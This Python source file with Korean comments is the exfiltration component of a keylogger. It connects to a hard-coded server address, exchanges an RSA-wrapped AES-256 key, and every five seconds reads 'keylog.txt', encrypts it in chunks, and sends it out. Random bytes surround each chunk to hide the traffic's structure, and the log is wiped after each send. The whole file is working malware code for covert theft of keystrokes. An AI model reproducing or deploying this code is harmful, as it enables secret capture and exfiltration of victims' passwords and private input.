from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import socket
import time

SERVER_IP = "172.25.80.140"
SERVER_PORT = 12345
BUFFER_SIZE = 1024
LOG_FILE = "keylog.txt"

# AES 대칭키
aes_key = None

# 패딩 추가 및 암호화
def encrypt_message_with_padding(message: bytes) -> bytes:
    iv = get_random_bytes(16)  # 16바이트 IV 생성
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # 패딩 추가 (AES 블록 크기: 16바이트)
    padding_length = 16 - len(message) % 16
    padded_message = message + bytes([padding_length]) * padding_length

    # 암호화
    encrypted_data = encryptor.update(padded_message) + encryptor.finalize()

    # 구조 제거: 랜덤 데이터를 앞뒤로 추가
    random_prefix = get_random_bytes(8)  # 8바이트 랜덤 데이터
    random_suffix = get_random_bytes(8)  # 8바이트 랜덤 데이터
    return random_prefix + iv + encrypted_data + random_suffix

# 서버로 로그 파일 전송
def send_log_to_server():
    global aes_key
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, SERVER_PORT))

            # 서버로부터 RSA 공개키 수신
            public_key_data = client_socket.recv(450)
            server_public_key = RSA.import_key(public_key_data)

            # AES 대칭키 생성 및 RSA 암호화 후 전송
            aes_key = get_random_bytes(32)  # AES 256-bit key 생성
            cipher_rsa = PKCS1_OAEP.new(server_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            client_socket.sendall(encrypted_aes_key)

            print("AES key securely sent to the server.")

            # 로그 파일 전송 루프
            while True:
                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                    with open(LOG_FILE, "rb") as file:
                        while (bytes_read := file.read(BUFFER_SIZE)):
                            encrypted_data = encrypt_message_with_padding(bytes_read)  # 암호화 및 구조 제거
                            client_socket.sendall(encrypted_data)  # 암호화된 데이터 전송
                            time.sleep(0.1)  # 데이터 전송 간격

                    print("Log file sent to server.")

                    # 로그 파일 초기화
                    open(LOG_FILE, "w").close()

                time.sleep(5)  # 5초마다 확인
    except Exception as e:
        print(f"Error sending data to server: {e}")
